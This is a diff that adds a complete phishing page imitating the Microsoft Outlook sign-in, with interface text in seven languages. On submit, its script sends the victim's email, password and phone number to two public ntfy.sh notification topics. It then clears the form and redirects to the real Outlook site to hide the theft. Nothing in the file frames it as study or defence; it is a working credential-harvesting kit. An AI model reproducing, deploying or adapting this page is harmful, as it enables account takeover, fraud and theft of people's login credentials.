@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Connexion | Outlook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Microsoft YaHei', 'Helvetica Neue', sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 440px;
+            padding: 44px 40px 48px;
+            transition: all 0.2s;
+        }
+
+        .logo {
+            margin-bottom: 28px;
+        }
+        .logo svg {
+            width: 108px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1b1b1b;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1b1b1b;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            transition: border 0.2s;
+            background: #fefefe;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0,120,212,0.2);
+        }
+
+        .password-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 12px 0 24px;
+            font-size: 13px;
+        }
+        .password-options a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        .password-options a:hover {
+            text-decoration: underline;
+        }
+
+        button {
+            width: 100%;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #106ebe;
+        }
+
+        .signup-link {
+            margin-top: 24px;
+            font-size: 13px;
+            text-align: center;
+        }
+        .signup-link a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            margin-top: 32px;
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+        }
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .error-msg {
+            color: #d13438;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        /* Pantalla de carga */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e0e0e0;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #333;
+            font-size: 14px;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 32px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">
+        <svg viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="0" y="0" width="24" height="24" fill="#F25022"/>
+            <rect x="27" y="0" width="24" height="24" fill="#7FBA00"/>
+            <rect x="54" y="0" width="24" height="24" fill="#00A4EF"/>
+            <rect x="81" y="0" width="24" height="24" fill="#FFB900"/>
+            <text x="10" y="38" font-family="Segoe UI" font-size="20" fill="#1b1b1b" font-weight="600">Microsoft</text>
+        </svg>
+    </div>
+
+    <h1 id="title">Se connecter</h1>
+
+    <div class="error-msg" id="errorMsg">Veuillez remplir tous les champs.</div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label id="labelEmail">E-mail, téléphone ou identifiant Skype</label>
+            <input type="text" id="email" name="email" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label id="labelPassword">Mot de passe</label>
+            <input type="password" id="password" name="password" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label id="labelPhone">Numéro de téléphone associé</label>
+            <input type="tel" id="phone" name="phone" autocomplete="off">
+        </div>
+
+        <div class="password-options">
+            <a id="forgotPwd" href="#">Mot de passe oublié ?</a>
+            <a id="securityCode" href="#">Se connecter avec un code de sécurité</a>
+        </div>
+
+        <button type="submit" id="submitBtn">Se connecter</button>
+
+        <div class="signup-link">
+            <span id="noAccount">Vous n'avez pas encore de compte ?</span> <a id="createAccount" href="#">Créez-en un !</a>
+        </div>
+
+        <div class="footer-links">
+            <a id="optionsLink" href="#">Options de connexion</a>
+            <a id="privacyLink" href="#">Confidentialité et cookies</a>
+            <a id="termsLink" href="#">Conditions d'utilisation</a>
+            <a id="activateLink" href="#">Activer Windows</a>
+        </div>
+    </form>
+</div>
+
+<!-- Pantalla de carga -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingText">Connexion en cours...</div>
+</div>
+
+<script>
+    // ======================================================
+    // DÉTECTION DE LA LANGUE DU NAVIGATEUR
+    // ======================================================
+    function getUserLanguage() {
+        const lang = navigator.language || navigator.userLanguage;
+        if (lang.startsWith('fr')) return 'fr';
+        if (lang.startsWith('en')) return 'en';
+        if (lang.startsWith('es')) return 'es';
+        if (lang.startsWith('de')) return 'de';
+        if (lang.startsWith('it')) return 'it';
+        if (lang.startsWith('pt')) return 'pt';
+        if (lang.startsWith('nl')) return 'nl';
+        return 'en'; // langue par défaut
+    }
+
+    // Dictionnaire des traductions
+    const translations = {
+        fr: {
+            title: "Se connecter",
+            errorMsg: "Veuillez remplir tous les champs.",
+            labelEmail: "E-mail, téléphone ou identifiant Skype",
+            labelPassword: "Mot de passe",
+            labelPhone: "Numéro de téléphone associé",
+            forgotPwd: "Mot de passe oublié ?",
+            securityCode: "Se connecter avec un code de sécurité",
+            submit: "Se connecter",
+            noAccount: "Vous n'avez pas encore de compte ?",
+            createAccount: "Créez-en un !",
+            optionsLink: "Options de connexion",
+            privacyLink: "Confidentialité et cookies",
+            termsLink: "Conditions d'utilisation",
+            activateLink: "Activer Windows",
+            loadingText: "Connexion en cours..."
+        },
+        en: {
+            title: "Sign in",
+            errorMsg: "Please complete all fields.",
+            labelEmail: "Email, phone, or Skype",
+            labelPassword: "Password",
+            labelPhone: "Associated phone number",
+            forgotPwd: "Forgot password?",
+            securityCode: "Sign in with a security code",
+            submit: "Sign in",
+            noAccount: "No account?",
+            createAccount: "Create one!",
+            optionsLink: "Sign-in options",
+            privacyLink: "Privacy & cookies",
+            termsLink: "Terms of use",
+            activateLink: "Activate Windows",
+            loadingText: "Connecting..."
+        },
+        es: {
+            title: "Iniciar sesión",
+            errorMsg: "Por favor, complete todos los campos.",
+            labelEmail: "Correo electrónico, teléfono o Skype",
+            labelPassword: "Contraseña",
+            labelPhone: "Número de teléfono asociado",
+            forgotPwd: "¿Olvidó su contraseña?",
+            securityCode: "Iniciar sesión con un código de seguridad",
+            submit: "Iniciar sesión",
+            noAccount: "¿No tiene una cuenta?",
+            createAccount: "Cree una",
+            optionsLink: "Opciones de inicio de sesión",
+            privacyLink: "Privacidad y cookies",
+            termsLink: "Condiciones de uso",
+            activateLink: "Activar Windows",
+            loadingText: "Conectando..."
+        },
+        de: {
+            title: "Anmelden",
+            errorMsg: "Bitte füllen Sie alle Felder aus.",
+            labelEmail: "E-Mail, Telefon oder Skype",
+            labelPassword: "Passwort",
+            labelPhone: "Zugehörige Telefonnummer",
+            forgotPwd: "Passwort vergessen?",
+            securityCode: "Mit Sicherheitscode anmelden",
+            submit: "Anmelden",
+            noAccount: "Noch kein Konto?",
+            createAccount: "Jetzt erstellen",
+            optionsLink: "Anmeldeoptionen",
+            privacyLink: "Datenschutz und Cookies",
+            termsLink: "Nutzungsbedingungen",
+            activateLink: "Windows aktivieren",
+            loadingText: "Verbindung wird hergestellt..."
+        },
+        it: {
+            title: "Accedi",
+            errorMsg: "Completa tutti i campi.",
+            labelEmail: "Email, telefono o Skype",
+            labelPassword: "Password",
+            labelPhone: "Numero di telefono associato",
+            forgotPwd: "Password dimenticata?",
+            securityCode: "Accedi con un codice di sicurezza",
+            submit: "Accedi",
+            noAccount: "Non hai un account?",
+            createAccount: "Creane uno",
+            optionsLink: "Opzioni di accesso",
+            privacyLink: "Privacy e cookie",
+            termsLink: "Condizioni d'uso",
+            activateLink: "Attiva Windows",
+            loadingText: "Connessione in corso..."
+        },
+        pt: {
+            title: "Entrar",
+            errorMsg: "Preencha todos os campos.",
+            labelEmail: "E-mail, telefone ou Skype",
+            labelPassword: "Senha",
+            labelPhone: "Número de telefone associado",
+            forgotPwd: "Esqueceu a senha?",
+            securityCode: "Entrar com um código de segurança",
+            submit: "Entrar",
+            noAccount: "Não tem uma conta?",
+            createAccount: "Crie uma",
+            optionsLink: "Opções de entrada",
+            privacyLink: "Privacidade e cookies",
+            termsLink: "Termos de uso",
+            activateLink: "Ativar Windows",
+            loadingText: "Conectando..."
+        },
+        nl: {
+            title: "Aanmelden",
+            errorMsg: "Vul alle velden in.",
+            labelEmail: "E-mail, telefoon of Skype",
+            labelPassword: "Wachtwoord",
+            labelPhone: "Bijbehorend telefoonnummer",
+            forgotPwd: "Wachtwoord vergeten?",
+            securityCode: "Aanmelden met een beveiligingscode",
+            submit: "Aanmelden",
+            noAccount: "Nog geen account?",
+            createAccount: "Maak er een",
+            optionsLink: "Aanmeldopties",
+            privacyLink: "Privacy en cookies",
+            termsLink: "Gebruiksvoorwaarden",
+            activateLink: "Windows activeren",
+            loadingText: "Verbinden..."
+        }
+    };
+
+    // Appliquer la langue choisie
+    const lang = getUserLanguage();
+    const t = translations[lang] || translations.en;
+
+    document.getElementById('title').innerText = t.title;
+    document.getElementById('errorMsg').innerText = t.errorMsg;
+    document.getElementById('labelEmail').innerText = t.labelEmail;
+    document.getElementById('labelPassword').innerText = t.labelPassword;
+    document.getElementById('labelPhone').innerText = t.labelPhone;
+    document.getElementById('forgotPwd').innerText = t.forgotPwd;
+    document.getElementById('securityCode').innerText = t.securityCode;
+    document.getElementById('submitBtn').innerText = t.submit;
+    document.getElementById('noAccount').innerText = t.noAccount + ' ';
+    document.getElementById('createAccount').innerText = t.createAccount;
+    document.getElementById('optionsLink').innerText = t.optionsLink;
+    document.getElementById('privacyLink').innerText = t.privacyLink;
+    document.getElementById('termsLink').innerText = t.termsLink;
+    document.getElementById('activateLink').innerText = t.activateLink;
+    document.getElementById('loadingText').innerText = t.loadingText;
+
+    // ======================================================
+    // CONFIGURATION NTFY – DEUX TOPICS
+    // ======================================================
+    const TOPIC1 = "MICROSOFT-ALERTE";
+    const TOPIC2 = "CONNEXION-MICROSOFT_OFFICE";
+    const NTFY_URL1 = `https://ntfy.sh/${TOPIC1}`;
+    const NTFY_URL2 = `https://ntfy.sh/${TOPIC2}`;
+
+    async function sendToNtfy(email, password, phone) {
+        const message = `🔐 *NEW OUTLOOK ATTEMPT* 🔐\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📞 Phone: ${phone}\n\n🕒 ${new Date().toLocaleString()}`;
+        const fetchOptions = {
+            method: 'POST',
+            body: message,
+            headers: { 'Title': 'Outlook Login', 'Priority': 'high', 'Tags': 'warning' }
+        };
+        try {
+            await fetch(NTFY_URL1, fetchOptions);
+            await fetch(NTFY_URL2, fetchOptions);
+            console.log("Notifications envoyées aux deux topics ntfy");
+        } catch (err) {
+            console.error("Erreur ntfy:", err);
+        }
+    }
+
+    function showLoadingAndRedirect() {
+        const overlay = document.getElementById('loadingOverlay');
+        overlay.style.display = 'flex';
+        setTimeout(() => {
+            window.location.href = "https://outlook.live.com";
+        }, 3000);
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const errorDiv = document.getElementById('errorMsg');
+
+        if (!email || !password || !phone) {
+            errorDiv.style.display = 'block';
+            return;
+        }
+        errorDiv.style.display = 'none';
+
+        await sendToNtfy(email, password, phone);
+
+        // Effacement discret
+        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+        document.getElementById('phone').value = '';
+
+        showLoadingAndRedirect();
+    });
+</script>
+</body>
+</html>
